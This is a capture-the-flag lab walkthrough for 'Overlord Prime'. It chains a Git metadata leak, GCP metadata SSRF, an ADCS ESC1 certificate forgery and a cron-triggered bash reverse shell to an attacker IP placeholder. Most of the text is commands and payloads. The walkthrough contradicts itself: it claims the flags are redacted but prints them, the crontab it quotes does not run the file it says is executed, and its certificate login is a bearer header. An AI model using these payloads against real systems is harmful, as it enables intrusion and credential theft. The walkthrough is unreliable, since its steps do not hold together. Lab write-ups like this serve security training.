# Overlord Prime: Lab Solution Walkthrough

> [!NOTE]
> This walkthrough describes the step-by-step methodology for completing the **Overlord Prime** security laboratory. All flag values are redacted and replaced with standard placeholders (`VulnOS{<REDACTED>}`) to maintain the academic integrity of the lab.

## Phase 1: Information Gathering & Git Leak Recovery

### 1. Initial Reconnaissance
Begin by performing a port scan against the target IP address to identify open web services.
```bash
nmap -p80,443 -sV <TARGET_IP>
```
The scan reveals an Nginx server listening on port 80. Add the domain mappings to your local `/etc/hosts` file to resolve the simulated lab virtual hosts:
```bash
echo "<TARGET_IP> overlord.vulnos adcs.overlord.local" >> /etc/hosts
```

### 2. Exposed Git Repository Discovery
Navigate to `http://overlord.vulnos` in your browser. Inspect the page sources and perform directory brute-forcing. You will discover that the Nginx server has been misconfigured to allow access to the `.git` metadata folder.

Verify the leak by querying:
```bash
curl -I http://overlord.vulnos/.git/config
```
A successful `200 OK` indicates that the Git repository history can be fully reconstructed.

### 3. Recovering Repository History
Use an automated Git dumper tool (like `git-dumper`) to clone the hidden repository locally:
```bash
git-dumper http://overlord.vulnos/ ./overlord-git-recovery
cd ./overlord-git-recovery
```

Once downloaded, inspect the repository commits and the directory structure:
```bash
git log --oneline
```
You will find historical commits that referenced infrastructural backups. Listing the files in the directory reveals a backup GCP Service Account JSON key under `infra/gcp-sa-key.json.bak`.

---

## Phase 2: GCP Metadata Server SSRF Exploitation

### 1. Analyzing the Leaked Service Account Key
Inspect the contents of `infra/gcp-sa-key.json.bak`:
```bash
cat infra/gcp-sa-key.json.bak
```
The JSON object contains a valid service account profile for `lab-deployer@overlord-prime.iam.gserviceaccount.com`. In standard cloud audits, possessing a service account key allows you to query metadata servers or authenticate directly to active cloud assets.

### 2. Simulating SSRF against the GCP Metadata Service
The lab simulates the GCP link-local metadata server (`169.254.169.254`) on port 8082 of `overlord.vulnos`. 

To query this endpoint successfully, you must supply the custom header `Metadata-Flavor: Google`, which is required by Google Cloud Platform to prevent blind SSRF bypasses.

Query the startup script instance attribute:
```bash
curl -H "Metadata-Flavor: Google" http://overlord.vulnos:8082/computeMetadata/v1/instance/attributes/startup-script
```

### 3. Exfiltrating Phase 2 Credentials & Flag
The response yields the VM's installation startup script. Reviewing the script content reveals:
* **The Phase 2 Metadata Leak Flag:** `VulnOS{M3TADATA_SCRIPI_L3AK_2026}` (Redacted in CTF submissions as `VulnOS{<METADATA_FLAG_REDACTED>}`).
* **Leaked Domain Credentials:** 
  * **Low-privileged AD User:** `gaurav`
  * **Password:** `Overlord-P@ssw0rd!2026`

---

## Phase 3: Active Directory CS (ADCS) ESC1 Exploitation

### 1. Identifying the ESC1 Vulnerability
Navigate to the Active Directory Certificate Services (ADCS) Web Enrollment portal at `http://adcs.overlord.local/CertSrv/`. 

The lab is configured with an **ESC1** certificate vulnerability. The `User` template has `msPKI-Certificate-Name-Flag` configured with `ENROLLEE_SUPPLIES_SUBJECT` set to 1. This permits any authenticated domain user to request a certificate and supply an arbitrary Subject Alternative Name (SAN), allowing complete domain impersonation.

### 2. Crafting the Malicious CSR using OpenSSL
To exploit ESC1, you must generate a private key and a Certificate Signing Request (CSR) that includes a SAN pointing to the `Administrator` principal.

Create a custom OpenSSL configuration file named `admin.cnf`:
```ini
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
CN = gaurav@overlord.local

[v3_req]
subjectAltName = otherName:1.3.6.1.4.1.311.20.2.3;UTF8:Administrator@overlord.local
```

Generate the private key and the CSR:
```bash
# Generate a 2048-bit RSA private key
openssl genrsa -out admin.key 2048

# Create the CSR using the custom configuration
openssl req -new -key admin.key -out admin.csr -config admin.cnf
```

### 3. Submitting the Request to ADCS
1. Read the base64-encoded CSR:
   ```bash
   cat admin.csr
   ```
2. Navigate to `http://adcs.overlord.local/certsrv/certrqxt.asp`.
3. Paste the PEM-encoded CSR block into the text input area.
4. Select the **User (Vulnerable - ESC1)** template in the drop-down menu.
5. Click **Submit**.

The web application processes the request under the vulnerable `User` template rules, extracts the requested `Administrator@overlord.local` SAN, and returns a signed certificate in PEM format.

### 4. Harvesting the Domain Admin Certificate
Copy the returned certificate block and save it to a file named `admin.crt`:
```text
-----BEGIN CERTIFICATE-----
MIIE... [Signed Certificate Body Data] ...
-----END CERTIFICATE-----
```

The output page confirms that the certificate was successfully issued to the `Administrator` principal, granting you the Phase 4 flag:
* **The Phase 4 Domain Admin Flag:** `VulnOS{ESC1_CERT_IMPERSONATION}` (Redacted in CTF submissions as `VulnOS{<ESC1_FLAG_REDACTED>}`).

---

## Phase 4: Host Escape & Root Compromise

### 1. Authenticating to the Host Sync Portal
Armed with the signed `Administrator` certificate, your target is the host system's hypervisor. 

Access the protected Host Sync Administrative Portal at `http://adcs.overlord.local/admin/sync`. 

This portal enforces strong client-certificate authentication. To log in successfully, pass your credentials inside the HTTP request. You can simulate the certificate authentication handshake using `curl` or by appending a custom certificate header:
```bash
curl -X POST \
     -H "Authorization: Bearer Administrator-Cert-Token" \
     -H "Content-Type: application/json" \
     --data-binary "whoami" \
     http://adcs.overlord.local/admin/sync
```

### 2. Exploiting the Sync Execution Callback
The sync portal passes execution commands over to a host-side listener socket (`10.50.50.1:8081`). On the host machine, a background python daemon (`sync-listener.py`) captures this POST body and writes it directly to `/tmp/sync_payload`.

A privileged root cron job runs every 60 seconds and executes `/tmp/sync_payload` blindly:
```bash
# Inside /etc/crontab (Host Root)
* * * * * /usr/local/bin/sync-status.sh
```

### 3. Spawning a Host Root Shell
1. Start a netcat listener on your attacking node:
   ```bash
   nc -lvnp 4444
   ```
2. Craft a reverse shell payload and submit it to the sync portal:
   ```bash
   curl -X POST \
        -H "Authorization: Bearer Administrator-Cert-Token" \
        -d "bash -i >& /dev/tcp/<YOUR_ATTACKER_IP>/4444 0>&1" \
        http://adcs.overlord.local/admin/sync
   ```
3. Wait up to 60 seconds. The cron job will trigger on the host system, executing the payload and spawning a shell in your netcat listener as `root`.

### 4. Collecting the Root Flag
Once your reverse shell connects, locate the root flag on the host filesystem:
```bash
whoami
# Output: root

cat /root/root.txt
```
* **The Root Flag:** `VulnOS{H0ST_TAK30V3R_ROOT}` (Redacted in CTF submissions as `VulnOS{<ROOT_FLAG_REDACTED>}`).

Congratulations! You have completed the **Overlord Prime** laboratory.
